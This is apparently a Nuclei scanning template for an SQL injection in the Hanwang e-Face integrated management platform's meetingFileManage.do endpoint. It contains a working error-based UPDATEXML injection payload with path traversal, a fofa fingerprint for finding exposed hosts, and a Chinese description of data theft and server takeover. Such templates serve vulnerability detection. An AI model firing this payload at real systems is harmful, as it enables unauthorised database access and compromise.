http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - qqjpq1qpkvq
            - 'XPATH syntax error:'
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /manage/intercom/..;/..;/manage/meeting/meetingFileManage.do?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
id: hanwangE-meetingFileManage_do-sql
info:
    author: Superhero
    description: |-
        fofa: icon_hash="1380907357"
        汉王e脸通综合管理平台 meetingFileManage.do 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 汉王e脸通综合管理平台 meetingFileManage.do SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/QBO02RP4Va9bGj4CljG8Sw
    severity: high
    tags:
        - Intercom
